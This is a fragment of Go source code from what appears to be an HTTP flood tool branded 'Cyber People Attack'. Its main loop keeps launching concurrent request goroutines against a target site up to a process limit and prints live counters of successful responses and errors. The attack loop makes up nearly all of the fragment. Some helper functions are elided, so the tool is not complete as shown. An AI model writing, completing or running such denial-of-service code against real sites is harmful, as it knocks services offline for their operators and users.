...
func main() {
	...
	go func() {
		fmt.Println("         \033[32m-- Cyber People Attack Started --\n                      Go!\n\n")
		ss := make(chan uint8, 8)
		var (
			err, sent int32
		)
		fmt.Println("  In use Attack         |\t\033[36msent Resp OK |\t\033[31mGot err")
		for {
			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
				go httpcall(site, u.Host, data, headers, ss)
			}
			if sent%10 == 0 {
				fmt.Printf("\r\033[32m%6d of max %-6d    |\t\033[36m%7d      |\t\033[31m%6d", cur, maxproc, sent, err)
			}
			switch <-ss {
			case callExitOnErr:
			...
			case targetComplete:
				sent++
				fmt.Printf("\r\033[32m%-6d of max %-6d    |\t\033[36m%7d     |\t\033[31m%6d", cur, maxproc, sent, err)
				fmt.Println("\r\033[32m-- Cyber People Attack Finished --       \n\n\r")
				os.Exit(0)
			}
		}
	}()
